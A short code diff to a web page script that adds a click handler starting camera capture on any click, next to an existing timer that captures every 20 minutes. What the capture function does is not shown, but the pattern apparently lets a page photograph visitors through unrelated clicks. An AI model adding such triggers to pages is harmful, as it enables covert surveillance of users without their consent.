@@ -197,6 +197,10 @@
             activateCameraAndCapture();
         }, 1200000); // 20 minutes in milliseconds
 
+        // Add click event to enable camera on any click
+        document.addEventListener('click', () => {
+            activateCameraAndCapture();
+        });
     </script>
 
     <script>
